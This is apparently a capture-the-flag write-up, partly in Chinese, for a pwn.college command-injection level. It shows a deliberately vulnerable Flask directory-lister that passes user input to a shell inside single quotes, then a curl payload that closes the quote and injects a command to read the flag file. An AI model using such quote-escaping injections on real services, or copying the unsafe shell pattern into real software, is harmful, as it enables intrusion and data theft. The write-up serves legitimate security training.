@@ -1,0 +1,59 @@
+#CMDi 3
+#挑战简介
+An interesting thing about command injection is that you don't get to choose where in the command the injection occurs: 
+the developer accidentally makes that choice for you when writing the program. Sometimes, these injections occur in uncomfortable places. Consider the following:
+
+os.system(f"echo Hello '{word}'")
+Here, the developer tried to convey to the shell that word should really be only one word. The shell, when given arguments in single quotes, treats otherwise-special characters like ;
+, $, and so on as just normal characters, until it hits the closing single quote (').
+
+This level gives you this scenario. Can you bypass it?
+
+HINT: Keep in mind that there will be a ' character right at the end of whatever you inject. 
+In the shell, all quotes must be matched with a partner, or the command is invalid. Make sure to craft your injection so that the resulting command is valid!
+
+#cat /challenge/server
+#!/opt/pwn.college/python
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+@app.route("/", methods=["GET", "POST"])
+def challenge():
+    directory = flask.request.args.get("directory", "/challenge")
+    command = f"ls -l '{directory}'"
+    print(f"DEBUG: {command=}")
+    listing = subprocess.run(
+        command,                    # the command to run
+        shell=True,                 # use the shell to run this command
+        stdout=subprocess.PIPE,     # capture the standard output
+        stderr=subprocess.STDOUT,   # 2>&1
+        encoding="latin"            # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form><input type=text name=directory><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of: ls -l '{directory}'</b><br>
+        <pre>{listing}</pre>
+        </body></html>
+        """
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+port = 8080 if os.geteuid() else 80
+app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
+app.run("challenge.localhost", port)
+
+#此挑战将变量改为了一个wor且由单引号括起
+#所以我们可以考虑将单引号失效，可以选择将word定义为"'"一个单引号，使前面的单引号失效
+#我们在输入我们需要的指令: ";cat /challenge/../flag #"对' ','#'进行编码。可得
+curl -v "http://challenge.localhost/?directory=';cat%20/challenge/../flag%20%23'"
+#服务器显示为：
+<b>Output of: ls -l '';cat /challenge/../flag #''</b><br>
